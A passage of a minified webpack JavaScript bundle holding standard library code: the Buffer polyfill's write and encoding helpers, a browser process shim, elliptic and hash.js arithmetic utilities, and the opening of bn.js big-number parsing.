                    return (value = +value), (offset |= 0), noAssert || checkInt(this, value, offset, 1, 255, 0), Buffer.TYPED_ARRAY_SUPPORT || (value = Math.floor(value)), (this[offset] = 255 & value), offset + 1;
                }),
                (Buffer.prototype.writeUInt16LE = function (value, offset, noAssert) {
                    return (
                        (value = +value),
                        (offset |= 0),
                        noAssert || checkInt(this, value, offset, 2, 65535, 0),
                        Buffer.TYPED_ARRAY_SUPPORT ? ((this[offset] = 255 & value), (this[offset + 1] = value >>> 8)) : objectWriteUInt16(this, value, offset, !0),
                        offset + 2
                    );
                }),
                (Buffer.prototype.writeUInt16BE = function (value, offset, noAssert) {
                    return (
                        (value = +value),
                        (offset |= 0),
                        noAssert || checkInt(this, value, offset, 2, 65535, 0),
                        Buffer.TYPED_ARRAY_SUPPORT ? ((this[offset] = value >>> 8), (this[offset + 1] = 255 & value)) : objectWriteUInt16(this, value, offset, !1),
                        offset + 2
                    );
                }),
                (Buffer.prototype.writeUInt32LE = function (value, offset, noAssert) {
                    return (
                        (value = +value),
                        (offset |= 0),
                        noAssert || checkInt(this, value, offset, 4, 4294967295, 0),
                        Buffer.TYPED_ARRAY_SUPPORT ? ((this[offset + 3] = value >>> 24), (this[offset + 2] = value >>> 16), (this[offset + 1] = value >>> 8), (this[offset] = 255 & value)) : objectWriteUInt32(this, value, offset, !0),
                        offset + 4
                    );
                }),
                (Buffer.prototype.writeUInt32BE = function (value, offset, noAssert) {
                    return (
                        (value = +value),
                        (offset |= 0),
                        noAssert || checkInt(this, value, offset, 4, 4294967295, 0),
                        Buffer.TYPED_ARRAY_SUPPORT ? ((this[offset] = value >>> 24), (this[offset + 1] = value >>> 16), (this[offset + 2] = value >>> 8), (this[offset + 3] = 255 & value)) : objectWriteUInt32(this, value, offset, !1),
                        offset + 4
                    );
                }),
                (Buffer.prototype.writeIntLE = function (value, offset, byteLength, noAssert) {
                    if (((value = +value), (offset |= 0), !noAssert)) {
                        var limit = Math.pow(2, 8 * byteLength - 1);
                        checkInt(this, value, offset, byteLength, limit - 1, -limit);
                    }
                    var i = 0,
                        mul = 1,
                        sub = 0;
                    for (this[offset] = 255 & value; ++i < byteLength && (mul *= 256); ) value < 0 && 0 === sub && 0 !== this[offset + i - 1] && (sub = 1), (this[offset + i] = (((value / mul) >> 0) - sub) & 255);
                    return offset + byteLength;
                }),
                (Buffer.prototype.writeIntBE = function (value, offset, byteLength, noAssert) {
                    if (((value = +value), (offset |= 0), !noAssert)) {
                        var limit = Math.pow(2, 8 * byteLength - 1);
                        checkInt(this, value, offset, byteLength, limit - 1, -limit);
                    }
                    var i = byteLength - 1,
                        mul = 1,
                        sub = 0;
                    for (this[offset + i] = 255 & value; --i >= 0 && (mul *= 256); ) value < 0 && 0 === sub && 0 !== this[offset + i + 1] && (sub = 1), (this[offset + i] = (((value / mul) >> 0) - sub) & 255);
                    return offset + byteLength;
                }),
                (Buffer.prototype.writeInt8 = function (value, offset, noAssert) {
                    return (
                        (value = +value),
                        (offset |= 0),
                        noAssert || checkInt(this, value, offset, 1, 127, -128),
                        Buffer.TYPED_ARRAY_SUPPORT || (value = Math.floor(value)),
                        value < 0 && (value = 255 + value + 1),
                        (this[offset] = 255 & value),
                        offset + 1
                    );
                }),
                (Buffer.prototype.writeInt16LE = function (value, offset, noAssert) {
                    return (
                        (value = +value),
                        (offset |= 0),
                        noAssert || checkInt(this, value, offset, 2, 32767, -32768),
                        Buffer.TYPED_ARRAY_SUPPORT ? ((this[offset] = 255 & value), (this[offset + 1] = value >>> 8)) : objectWriteUInt16(this, value, offset, !0),
                        offset + 2
                    );
                }),
                (Buffer.prototype.writeInt16BE = function (value, offset, noAssert) {
                    return (
                        (value = +value),
                        (offset |= 0),
                        noAssert || checkInt(this, value, offset, 2, 32767, -32768),
                        Buffer.TYPED_ARRAY_SUPPORT ? ((this[offset] = value >>> 8), (this[offset + 1] = 255 & value)) : objectWriteUInt16(this, value, offset, !1),
                        offset + 2
                    );
                }),
                (Buffer.prototype.writeInt32LE = function (value, offset, noAssert) {
                    return (
                        (value = +value),
                        (offset |= 0),
                        noAssert || checkInt(this, value, offset, 4, 2147483647, -2147483648),
                        Buffer.TYPED_ARRAY_SUPPORT ? ((this[offset] = 255 & value), (this[offset + 1] = value >>> 8), (this[offset + 2] = value >>> 16), (this[offset + 3] = value >>> 24)) : objectWriteUInt32(this, value, offset, !0),
                        offset + 4
                    );
                }),
                (Buffer.prototype.writeInt32BE = function (value, offset, noAssert) {
                    return (
                        (value = +value),
                        (offset |= 0),
                        noAssert || checkInt(this, value, offset, 4, 2147483647, -2147483648),
                        value < 0 && (value = 4294967295 + value + 1),
                        Buffer.TYPED_ARRAY_SUPPORT ? ((this[offset] = value >>> 24), (this[offset + 1] = value >>> 16), (this[offset + 2] = value >>> 8), (this[offset + 3] = 255 & value)) : objectWriteUInt32(this, value, offset, !1),
                        offset + 4
                    );
                }),
                (Buffer.prototype.writeFloatLE = function (value, offset, noAssert) {
                    return writeFloat(this, value, offset, !0, noAssert);
                }),
                (Buffer.prototype.writeFloatBE = function (value, offset, noAssert) {
                    return writeFloat(this, value, offset, !1, noAssert);
                }),
                (Buffer.prototype.writeDoubleLE = function (value, offset, noAssert) {
                    return writeDouble(this, value, offset, !0, noAssert);
                }),
                (Buffer.prototype.writeDoubleBE = function (value, offset, noAssert) {
                    return writeDouble(this, value, offset, !1, noAssert);
                }),
                (Buffer.prototype.copy = function (target, targetStart, start, end) {
                    if (
                        (start || (start = 0), end || 0 === end || (end = this.length), targetStart >= target.length && (targetStart = target.length), targetStart || (targetStart = 0), end > 0 && end < start && (end = start), end === start)
                    )
                        return 0;
                    if (0 === target.length || 0 === this.length) return 0;
                    if (targetStart < 0) throw new RangeError("targetStart out of bounds");
                    if (start < 0 || start >= this.length) throw new RangeError("sourceStart out of bounds");
                    if (end < 0) throw new RangeError("sourceEnd out of bounds");
                    end > this.length && (end = this.length), target.length - targetStart < end - start && (end = target.length - targetStart + start);
                    var i,
                        len = end - start;
                    if (this === target && start < targetStart && targetStart < end) for (i = len - 1; i >= 0; --i) target[i + targetStart] = this[i + start];
                    else if (len < 1e3 || !Buffer.TYPED_ARRAY_SUPPORT) for (i = 0; i < len; ++i) target[i + targetStart] = this[i + start];
                    else Uint8Array.prototype.set.call(target, this.subarray(start, start + len), targetStart);
                    return len;
                }),
                (Buffer.prototype.fill = function (val, start, end, encoding) {
                    if ("string" == typeof val) {
                        if (("string" == typeof start ? ((encoding = start), (start = 0), (end = this.length)) : "string" == typeof end && ((encoding = end), (end = this.length)), 1 === val.length)) {
                            var code = val.charCodeAt(0);
                            code < 256 && (val = code);
                        }
                        if (void 0 !== encoding && "string" != typeof encoding) throw new TypeError("encoding must be a string");
                        if ("string" == typeof encoding && !Buffer.isEncoding(encoding)) throw new TypeError("Unknown encoding: " + encoding);
                    } else "number" == typeof val && (val &= 255);
                    if (start < 0 || this.length < start || this.length < end) throw new RangeError("Out of range index");
                    if (end <= start) return this;
                    var i;
                    if (((start >>>= 0), (end = void 0 === end ? this.length : end >>> 0), val || (val = 0), "number" == typeof val)) for (i = start; i < end; ++i) this[i] = val;
                    else {
                        var bytes = Buffer.isBuffer(val) ? val : utf8ToBytes(new Buffer(val, encoding).toString()),
                            len = bytes.length;
                        for (i = 0; i < end - start; ++i) this[i + start] = bytes[i % len];
                    }
                    return this;
                });
            var INVALID_BASE64_RE = /[^+\/0-9A-Za-z-_]/g;
            function toHex(n) {
                return n < 16 ? "0" + n.toString(16) : n.toString(16);
            }
            function utf8ToBytes(string, units) {
                var codePoint;
                units = units || 1 / 0;
                for (var length = string.length, leadSurrogate = null, bytes = [], i = 0; i < length; ++i) {
                    if ((codePoint = string.charCodeAt(i)) > 55295 && codePoint < 57344) {
                        if (!leadSurrogate) {
                            if (codePoint > 56319) {
                                (units -= 3) > -1 && bytes.push(239, 191, 189);
                                continue;
                            }
                            if (i + 1 === length) {
                                (units -= 3) > -1 && bytes.push(239, 191, 189);
                                continue;
                            }
                            leadSurrogate = codePoint;
                            continue;
                        }
                        if (codePoint < 56320) {
                            (units -= 3) > -1 && bytes.push(239, 191, 189), (leadSurrogate = codePoint);
                            continue;
                        }
                        codePoint = 65536 + (((leadSurrogate - 55296) << 10) | (codePoint - 56320));
                    } else leadSurrogate && (units -= 3) > -1 && bytes.push(239, 191, 189);
                    if (((leadSurrogate = null), codePoint < 128)) {
                        if ((units -= 1) < 0) break;
                        bytes.push(codePoint);
                    } else if (codePoint < 2048) {
                        if ((units -= 2) < 0) break;
                        bytes.push((codePoint >> 6) | 192, (63 & codePoint) | 128);
                    } else if (codePoint < 65536) {
                        if ((units -= 3) < 0) break;
                        bytes.push((codePoint >> 12) | 224, ((codePoint >> 6) & 63) | 128, (63 & codePoint) | 128);
                    } else {
                        if (!(codePoint < 1114112)) throw new Error("Invalid code point");
                        if ((units -= 4) < 0) break;
                        bytes.push((codePoint >> 18) | 240, ((codePoint >> 12) & 63) | 128, ((codePoint >> 6) & 63) | 128, (63 & codePoint) | 128);
                    }
                }
                return bytes;
            }
            function base64ToBytes(str) {
                return base64.toByteArray(
                    (function (str) {
                        if (
                            (str = (function (str) {
                                return str.trim ? str.trim() : str.replace(/^\s+|\s+$/g, "");
                            })(str).replace(INVALID_BASE64_RE, "")).length < 2
                        )
                            return "";
                        for (; str.length % 4 != 0; ) str += "=";
                        return str;
                    })(str)
                );
            }
            function blitBuffer(src, dst, offset, length) {
                for (var i = 0; i < length && !(i + offset >= dst.length || i >= src.length); ++i) dst[i + offset] = src[i];
                return i;
            }
        }.call(this, __webpack_require__(8)));
    },
    function (module, exports) {
        var cachedSetTimeout,
            cachedClearTimeout,
            process = (module.exports = {});
        function defaultSetTimout() {
            throw new Error("setTimeout has not been defined");
        }
        function defaultClearTimeout() {
            throw new Error("clearTimeout has not been defined");
        }
        function runTimeout(fun) {
            if (cachedSetTimeout === setTimeout) return setTimeout(fun, 0);
            if ((cachedSetTimeout === defaultSetTimout || !cachedSetTimeout) && setTimeout) return (cachedSetTimeout = setTimeout), setTimeout(fun, 0);
            try {
                return cachedSetTimeout(fun, 0);
            } catch (e) {
                try {
                    return cachedSetTimeout.call(null, fun, 0);
                } catch (e) {
                    return cachedSetTimeout.call(this, fun, 0);
                }
            }
        }
        !(function () {
            try {
                cachedSetTimeout = "function" == typeof setTimeout ? setTimeout : defaultSetTimout;
            } catch (e) {
                cachedSetTimeout = defaultSetTimout;
            }
            try {
                cachedClearTimeout = "function" == typeof clearTimeout ? clearTimeout : defaultClearTimeout;
            } catch (e) {
                cachedClearTimeout = defaultClearTimeout;
            }
        })();
        var currentQueue,
            queue = [],
            draining = !1,
            queueIndex = -1;
        function cleanUpNextTick() {
            draining && currentQueue && ((draining = !1), currentQueue.length ? (queue = currentQueue.concat(queue)) : (queueIndex = -1), queue.length && drainQueue());
        }
        function drainQueue() {
            if (!draining) {
                var timeout = runTimeout(cleanUpNextTick);
                draining = !0;
                for (var len = queue.length; len; ) {
                    for (currentQueue = queue, queue = []; ++queueIndex < len; ) currentQueue && currentQueue[queueIndex].run();
                    (queueIndex = -1), (len = queue.length);
                }
                (currentQueue = null),
                    (draining = !1),
                    (function (marker) {
                        if (cachedClearTimeout === clearTimeout) return clearTimeout(marker);
                        if ((cachedClearTimeout === defaultClearTimeout || !cachedClearTimeout) && clearTimeout) return (cachedClearTimeout = clearTimeout), clearTimeout(marker);
                        try {
                            cachedClearTimeout(marker);
                        } catch (e) {
                            try {
                                return cachedClearTimeout.call(null, marker);
                            } catch (e) {
                                return cachedClearTimeout.call(this, marker);
                            }
                        }
                    })(timeout);
            }
        }
        function Item(fun, array) {
            (this.fun = fun), (this.array = array);
        }
        function noop() {}
        (process.nextTick = function (fun) {
            var args = new Array(arguments.length - 1);
            if (arguments.length > 1) for (var i = 1; i < arguments.length; i++) args[i - 1] = arguments[i];
            queue.push(new Item(fun, args)), 1 !== queue.length || draining || runTimeout(drainQueue);
        }),
            (Item.prototype.run = function () {
                this.fun.apply(null, this.array);
            }),
            (process.title = "browser"),
            (process.browser = !0),
            (process.env = {}),
            (process.argv = []),
            (process.version = ""),
            (process.versions = {}),
            (process.on = noop),
            (process.addListener = noop),
            (process.once = noop),
            (process.off = noop),
            (process.removeListener = noop),
            (process.removeAllListeners = noop),
            (process.emit = noop),
            (process.prependListener = noop),
            (process.prependOnceListener = noop),
            (process.listeners = function (name) {
                return [];
            }),
            (process.binding = function (name) {
                throw new Error("process.binding is not supported");
            }),
            (process.cwd = function () {
                return "/";
            }),
            (process.chdir = function (dir) {
                throw new Error("process.chdir is not supported");
            }),
            (process.umask = function () {
                return 0;
            });
    },
    function (module, exports) {
        var g;
        g = (function () {
            return this;
        })();
        try {
            g = g || new Function("return this")();
        } catch (e) {
            "object" == typeof window && (g = window);
        }
        module.exports = g;
    },
    ,
    function (module, exports, __webpack_require__) {
        "use strict";
        !(function checkDCE() {
            if ("undefined" != typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ && "function" == typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE) {
                0;
                try {
                    __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(checkDCE);
                } catch (err) {
                    console.error(err);
                }
            }
        })(),
            (module.exports = __webpack_require__(165));
    },
    function (module, exports) {
        function assert(val, msg) {
            if (!val) throw new Error(msg || "Assertion failed");
        }
        (module.exports = assert),
            (assert.equal = function (l, r, msg) {
                if (l != r) throw new Error(msg || "Assertion failed: " + l + " != " + r);
            });
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        var utils = exports,
            BN = __webpack_require__(15),
            minAssert = __webpack_require__(11),
            minUtils = __webpack_require__(119);
        (utils.assert = minAssert),
            (utils.toArray = minUtils.toArray),
            (utils.zero2 = minUtils.zero2),
            (utils.toHex = minUtils.toHex),
            (utils.encode = minUtils.encode),
            (utils.getNAF = function (num, w, bits) {
                var naf = new Array(Math.max(num.bitLength(), bits) + 1);
                naf.fill(0);
                for (var ws = 1 << (w + 1), k = num.clone(), i = 0; i < naf.length; i++) {
                    var z,
                        mod = k.andln(ws - 1);
                    k.isOdd() ? ((z = mod > (ws >> 1) - 1 ? (ws >> 1) - mod : mod), k.isubn(z)) : (z = 0), (naf[i] = z), k.iushrn(1);
                }
                return naf;
            }),
            (utils.getJSF = function (k1, k2) {
                var jsf = [[], []];
                (k1 = k1.clone()), (k2 = k2.clone());
                for (var m8, d1 = 0, d2 = 0; k1.cmpn(-d1) > 0 || k2.cmpn(-d2) > 0; ) {
                    var u1,
                        u2,
                        m14 = (k1.andln(3) + d1) & 3,
                        m24 = (k2.andln(3) + d2) & 3;
                    3 === m14 && (m14 = -1),
                        3 === m24 && (m24 = -1),
                        (u1 = 0 == (1 & m14) ? 0 : (3 !== (m8 = (k1.andln(7) + d1) & 7) && 5 !== m8) || 2 !== m24 ? m14 : -m14),
                        jsf[0].push(u1),
                        (u2 = 0 == (1 & m24) ? 0 : (3 !== (m8 = (k2.andln(7) + d2) & 7) && 5 !== m8) || 2 !== m14 ? m24 : -m24),
                        jsf[1].push(u2),
                        2 * d1 === u1 + 1 && (d1 = 1 - d1),
                        2 * d2 === u2 + 1 && (d2 = 1 - d2),
                        k1.iushrn(1),
                        k2.iushrn(1);
                }
                return jsf;
            }),
            (utils.cachedProperty = function (obj, name, computer) {
                var key = "_" + name;
                obj.prototype[name] = function () {
                    return void 0 !== this[key] ? this[key] : (this[key] = computer.call(this));
                };
            }),
            (utils.parseBytes = function (bytes) {
                return "string" == typeof bytes ? utils.toArray(bytes, "hex") : bytes;
            }),
            (utils.intFromLE = function (bytes) {
                return new BN(bytes, "hex", "le");
            });
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        var assert = __webpack_require__(11),
            inherits = __webpack_require__(3);
        function isSurrogatePair(msg, i) {
            return 55296 == (64512 & msg.charCodeAt(i)) && !(i < 0 || i + 1 >= msg.length) && 56320 == (64512 & msg.charCodeAt(i + 1));
        }
        function htonl(w) {
            return ((w >>> 24) | ((w >>> 8) & 65280) | ((w << 8) & 16711680) | ((255 & w) << 24)) >>> 0;
        }
        function zero2(word) {
            return 1 === word.length ? "0" + word : word;
        }
        function zero8(word) {
            return 7 === word.length
                ? "0" + word
                : 6 === word.length
                ? "00" + word
                : 5 === word.length
                ? "000" + word
                : 4 === word.length
                ? "0000" + word
                : 3 === word.length
                ? "00000" + word
                : 2 === word.length
                ? "000000" + word
                : 1 === word.length
                ? "0000000" + word
                : word;
        }
        (exports.inherits = inherits),
            (exports.toArray = function (msg, enc) {
                if (Array.isArray(msg)) return msg.slice();
                if (!msg) return [];
                var res = [];
                if ("string" == typeof msg)
                    if (enc) {
                        if ("hex" === enc) for ((msg = msg.replace(/[^a-z0-9]+/gi, "")).length % 2 != 0 && (msg = "0" + msg), i = 0; i < msg.length; i += 2) res.push(parseInt(msg[i] + msg[i + 1], 16));
                    } else
                        for (var p = 0, i = 0; i < msg.length; i++) {
                            var c = msg.charCodeAt(i);
                            c < 128
                                ? (res[p++] = c)
                                : c < 2048
                                ? ((res[p++] = (c >> 6) | 192), (res[p++] = (63 & c) | 128))
                                : isSurrogatePair(msg, i)
                                ? ((c = 65536 + ((1023 & c) << 10) + (1023 & msg.charCodeAt(++i))), (res[p++] = (c >> 18) | 240), (res[p++] = ((c >> 12) & 63) | 128), (res[p++] = ((c >> 6) & 63) | 128), (res[p++] = (63 & c) | 128))
                                : ((res[p++] = (c >> 12) | 224), (res[p++] = ((c >> 6) & 63) | 128), (res[p++] = (63 & c) | 128));
                        }
                else for (i = 0; i < msg.length; i++) res[i] = 0 | msg[i];
                return res;
            }),
            (exports.toHex = function (msg) {
                for (var res = "", i = 0; i < msg.length; i++) res += zero2(msg[i].toString(16));
                return res;
            }),
            (exports.htonl = htonl),
            (exports.toHex32 = function (msg, endian) {
                for (var res = "", i = 0; i < msg.length; i++) {
                    var w = msg[i];
                    "little" === endian && (w = htonl(w)), (res += zero8(w.toString(16)));
                }
                return res;
            }),
            (exports.zero2 = zero2),
            (exports.zero8 = zero8),
            (exports.join32 = function (msg, start, end, endian) {
                var len = end - start;
                assert(len % 4 == 0);
                for (var res = new Array(len / 4), i = 0, k = start; i < res.length; i++, k += 4) {
                    var w;
                    (w = "big" === endian ? (msg[k] << 24) | (msg[k + 1] << 16) | (msg[k + 2] << 8) | msg[k + 3] : (msg[k + 3] << 24) | (msg[k + 2] << 16) | (msg[k + 1] << 8) | msg[k]), (res[i] = w >>> 0);
                }
                return res;
            }),
            (exports.split32 = function (msg, endian) {
                for (var res = new Array(4 * msg.length), i = 0, k = 0; i < msg.length; i++, k += 4) {
                    var m = msg[i];
                    "big" === endian
                        ? ((res[k] = m >>> 24), (res[k + 1] = (m >>> 16) & 255), (res[k + 2] = (m >>> 8) & 255), (res[k + 3] = 255 & m))
                        : ((res[k + 3] = m >>> 24), (res[k + 2] = (m >>> 16) & 255), (res[k + 1] = (m >>> 8) & 255), (res[k] = 255 & m));
                }
                return res;
            }),
            (exports.rotr32 = function (w, b) {
                return (w >>> b) | (w << (32 - b));
            }),
            (exports.rotl32 = function (w, b) {
                return (w << b) | (w >>> (32 - b));
            }),
            (exports.sum32 = function (a, b) {
                return (a + b) >>> 0;
            }),
            (exports.sum32_3 = function (a, b, c) {
                return (a + b + c) >>> 0;
            }),
            (exports.sum32_4 = function (a, b, c, d) {
                return (a + b + c + d) >>> 0;
            }),
            (exports.sum32_5 = function (a, b, c, d, e) {
                return (a + b + c + d + e) >>> 0;
            }),
            (exports.sum64 = function (buf, pos, ah, al) {
                var bh = buf[pos],
                    lo = (al + buf[pos + 1]) >>> 0,
                    hi = (lo < al ? 1 : 0) + ah + bh;
                (buf[pos] = hi >>> 0), (buf[pos + 1] = lo);
            }),
            (exports.sum64_hi = function (ah, al, bh, bl) {
                return (((al + bl) >>> 0 < al ? 1 : 0) + ah + bh) >>> 0;
            }),
            (exports.sum64_lo = function (ah, al, bh, bl) {
                return (al + bl) >>> 0;
            }),
            (exports.sum64_4_hi = function (ah, al, bh, bl, ch, cl, dh, dl) {
                var carry = 0,
                    lo = al;
                return (carry += (lo = (lo + bl) >>> 0) < al ? 1 : 0), (carry += (lo = (lo + cl) >>> 0) < cl ? 1 : 0), (ah + bh + ch + dh + (carry += (lo = (lo + dl) >>> 0) < dl ? 1 : 0)) >>> 0;
            }),
            (exports.sum64_4_lo = function (ah, al, bh, bl, ch, cl, dh, dl) {
                return (al + bl + cl + dl) >>> 0;
            }),
            (exports.sum64_5_hi = function (ah, al, bh, bl, ch, cl, dh, dl, eh, el) {
                var carry = 0,
                    lo = al;
                return (
                    (carry += (lo = (lo + bl) >>> 0) < al ? 1 : 0),
                    (carry += (lo = (lo + cl) >>> 0) < cl ? 1 : 0),
                    (carry += (lo = (lo + dl) >>> 0) < dl ? 1 : 0),
                    (ah + bh + ch + dh + eh + (carry += (lo = (lo + el) >>> 0) < el ? 1 : 0)) >>> 0
                );
            }),
            (exports.sum64_5_lo = function (ah, al, bh, bl, ch, cl, dh, dl, eh, el) {
                return (al + bl + cl + dl + el) >>> 0;
            }),
            (exports.rotr64_hi = function (ah, al, num) {
                return ((al << (32 - num)) | (ah >>> num)) >>> 0;
            }),
            (exports.rotr64_lo = function (ah, al, num) {
                return ((ah << (32 - num)) | (al >>> num)) >>> 0;
            }),
            (exports.shr64_hi = function (ah, al, num) {
                return ah >>> num;
            }),
            (exports.shr64_lo = function (ah, al, num) {
                return ((ah << (32 - num)) | (al >>> num)) >>> 0;
            });
    },
    function (module, __webpack_exports__, __webpack_require__) {
        "use strict";
        __webpack_require__.d(__webpack_exports__, "a", function () {
            return _inheritsLoose;
        });
        var _setPrototypeOf_js__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(43);
        function _inheritsLoose(subClass, superClass) {
            (subClass.prototype = Object.create(superClass.prototype)), (subClass.prototype.constructor = subClass), Object(_setPrototypeOf_js__WEBPACK_IMPORTED_MODULE_0__.a)(subClass, superClass);
        }
    },
    function (module, exports, __webpack_require__) {
        (function (module) {
            !(function (module, exports) {
                "use strict";
                function assert(val, msg) {
                    if (!val) throw new Error(msg || "Assertion failed");
                }
                function inherits(ctor, superCtor) {
                    ctor.super_ = superCtor;
                    var TempCtor = function () {};
                    (TempCtor.prototype = superCtor.prototype), (ctor.prototype = new TempCtor()), (ctor.prototype.constructor = ctor);
                }
                function BN(number, base, endian) {
                    if (BN.isBN(number)) return number;
                    (this.negative = 0),
                        (this.words = null),
                        (this.length = 0),
                        (this.red = null),
                        null !== number && (("le" !== base && "be" !== base) || ((endian = base), (base = 10)), this._init(number || 0, base || 10, endian || "be"));
                }
                var Buffer;
                "object" == typeof module ? (module.exports = BN) : (exports.BN = BN), (BN.BN = BN), (BN.wordSize = 26);
                try {
                    Buffer = "undefined" != typeof window && void 0 !== window.Buffer ? window.Buffer : __webpack_require__(252).Buffer;
                } catch (e) {}
                function parseHex4Bits(string, index) {
                    var c = string.charCodeAt(index);
                    return c >= 65 && c <= 70 ? c - 55 : c >= 97 && c <= 102 ? c - 87 : (c - 48) & 15;
                }
                function parseHexByte(string, lowerBound, index) {
                    var r = parseHex4Bits(string, index);
                    return index - 1 >= lowerBound && (r |= parseHex4Bits(string, index - 1) << 4), r;
                }
                function parseBase(str, start, end, mul) {
                    for (var r = 0, len = Math.min(str.length, end), i = start; i < len; i++) {
                        var c = str.charCodeAt(i) - 48;
                        (r *= mul), (r += c >= 49 ? c - 49 + 10 : c >= 17 ? c - 17 + 10 : c);
                    }
                    return r;
                }
                (BN.isBN = function (num) {
                    return num instanceof BN || (null !== num && "object" == typeof num && num.constructor.wordSize === BN.wordSize && Array.isArray(num.words));
                }),
                    (BN.max = function (left, right) {
                        return left.cmp(right) > 0 ? left : right;
                    }),
                    (BN.min = function (left, right) {
                        return left.cmp(right) < 0 ? left : right;
                    }),
                    (BN.prototype._init = function (number, base, endian) {
                        if ("number" == typeof number) return this._initNumber(number, base, endian);
                        if ("object" == typeof number) return this._initArray(number, base, endian);
                        "hex" === base && (base = 16), assert(base === (0 | base) && base >= 2 && base <= 36);
                        var start = 0;
                        "-" === (number = number.toString().replace(/\s+/g, ""))[0] && (start++, (this.negative = 1)),
                            start < number.length && (16 === base ? this._parseHex(number, start, endian) : (this._parseBase(number, base, start), "le" === endian && this._initArray(this.toArray(), base, endian)));
                    }),
                    (BN.prototype._initNumber = function (number, base, endian) {
                        number < 0 && ((this.negative = 1), (number = -number)),
                            number < 67108864
                                ? ((this.words = [67108863 & number]), (this.length = 1))
                                : number < 4503599627370496
                                ? ((this.words = [67108863 & number, (number / 67108864) & 67108863]), (this.length = 2))
                                : (assert(number < 9007199254740992), (this.words = [67108863 & number, (number / 67108864) & 67108863, 1]), (this.length = 3)),
                            "le" === endian && this._initArray(this.toArray(), base, endian);
                    }),
                    (BN.prototype._initArray = function (number, base, endian) {
                        if ((assert("number" == typeof number.length), number.length <= 0)) return (this.words = [0]), (this.length = 1), this;
                        (this.length = Math.ceil(number.length / 3)), (this.words = new Array(this.length));
                        for (var i = 0; i < this.length; i++) this.words[i] = 0;
                        var j,
                            w,
                            off = 0;
                        if ("be" === endian)
                            for (i = number.length - 1, j = 0; i >= 0; i -= 3)
                                (w = number[i] | (number[i - 1] << 8) | (number[i - 2] << 16)), (this.words[j] |= (w << off) & 67108863), (this.words[j + 1] = (w >>> (26 - off)) & 67108863), (off += 24) >= 26 && ((off -= 26), j++);
                        else if ("le" === endian)
                            for (i = 0, j = 0; i < number.length; i += 3)
                                (w = number[i] | (number[i + 1] << 8) | (number[i + 2] << 16)), (this.words[j] |= (w << off) & 67108863), (this.words[j + 1] = (w >>> (26 - off)) & 67108863), (off += 24) >= 26 && ((off -= 26), j++);
                        return this.strip();
                    }),
                    (BN.prototype._parseHex = function (number, start, endian) {
                        (this.length = Math.ceil((number.length - start) / 6)), (this.words = new Array(this.length));
                        for (var i = 0; i < this.length; i++) this.words[i] = 0;
                        var w,
                            off = 0,
                            j = 0;
                        if ("be" === endian)
                            for (i = number.length - 1; i >= start; i -= 2) (w = parseHexByte(number, start, i) << off), (this.words[j] |= 67108863 & w), off >= 18 ? ((off -= 18), (j += 1), (this.words[j] |= w >>> 26)) : (off += 8);
                        else
                            for (i = (number.length - start) % 2 == 0 ? start + 1 : start; i < number.length; i += 2)
                                (w = parseHexByte(number, start, i) << off), (this.words[j] |= 67108863 & w), off >= 18 ? ((off -= 18), (j += 1), (this.words[j] |= w >>> 26)) : (off += 8);
                        this.strip();
                    }),
                    (BN.prototype._parseBase = function (number, base, start) {
                        (this.words = [0]), (this.length = 1);
                        for (var limbLen = 0, limbPow = 1; limbPow <= 67108863; limbPow *= base) limbLen++;
                        limbLen--, (limbPow = (limbPow / base) | 0);
                        for (var total = number.length - start, mod = total % limbLen, end = Math.min(total, total - mod) + start, word = 0, i = start; i < end; i += limbLen)
                            (word = parseBase(number, i, i + limbLen, base)), this.imuln(limbPow), this.words[0] + word < 67108864 ? (this.words[0] += word) : this._iaddn(word);
                        if (0 !== mod) {
                            var pow = 1;
                            for (word = parseBase(number, i, number.length, base), i = 0; i < mod; i++) pow *= base;
                            this.imuln(pow), this.words[0] + word < 67108864 ? (this.words[0] += word) : this._iaddn(word);
                        }
                        this.strip();
                    }),
                    (BN.prototype.copy = function (dest) {
                        dest.words = new Array(this.length);
                        for (var i = 0; i < this.length; i++) dest.words[i] = this.words[i];
                        (dest.length = this.length), (dest.negative = this.negative), (dest.red = this.red);
                    }),
                    (BN.prototype.clone = function () {
                        var r = new BN(null);
                        return this.copy(r), r;
                    }),
                    (BN.prototype._expand = function (size) {
                        for (; this.length < size; ) this.words[this.length++] = 0;
                        return this;
                    }),
                    (BN.prototype.strip = function () {
                        for (; this.length > 1 && 0 === this.words[this.length - 1]; ) this.length--;
                        return this._normSign();
                    }),
                    (BN.prototype._normSign = function () {
                        return 1 === this.length && 0 === this.words[0] && (this.negative = 0), this;
                    }),
                    (BN.prototype.inspect = function () {
                        return (this.red ? "<BN-R: " : "<BN: ") + this.toString(16) + ">";
                    });
                var zeros = [
                        "",
                        "0",
                        "00",
                        "000",
                        "0000",
                        "00000",
                        "000000",
                        "0000000",
                        "00000000",
                        "000000000",
                        "0000000000",
                        "00000000000",
                        "000000000000",
                        "0000000000000",
                        "00000000000000",
                        "000000000000000",
                        "0000000000000000",
                        "00000000000000000",
                        "000000000000000000",
                        "0000000000000000000",
                        "00000000000000000000",
                        "000000000000000000000",
                        "0000000000000000000000",
                        "00000000000000000000000",
                        "000000000000000000000000",
                        "0000000000000000000000000",
                    ],
                    groupSizes = [0, 0, 25, 16, 12, 11, 10, 9, 8, 8, 7, 7, 7, 7, 6, 6, 6, 6, 6, 6, 6, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5],
                    groupBases = [
                        0,
                        0,
                        33554432,
                        43046721,
                        16777216,
                        48828125,
                        60466176,
                        40353607,
                        16777216,
                        43046721,
                        1e7,
                        19487171,
                        35831808,
                        62748517,
                        7529536,
                        11390625,
                        16777216,
                        24137569,
                        34012224,
                        47045881,
                        64e6,
                        4084101,
                        5153632,
                        6436343,
                        7962624,
                        9765625,
                        11881376,
                        14348907,
                        17210368,
                        20511149,
                        243e5,
                        28629151,
                        33554432,
                        39135393,
                        45435424,
                        52521875,
                        60466176,
                    ];
                function smallMulTo(self, num, out) {
                    out.negative = num.negative ^ self.negative;
                    var len = (self.length + num.length) | 0;
                    (out.length = len), (len = (len - 1) | 0);
                    var a = 0 | self.words[0],
                        b = 0 | num.words[0],
                        r = a * b,
                        lo = 67108863 & r,
                        carry = (r / 67108864) | 0;
                    out.words[0] = lo;
                    for (var k = 1; k < len; k++) {
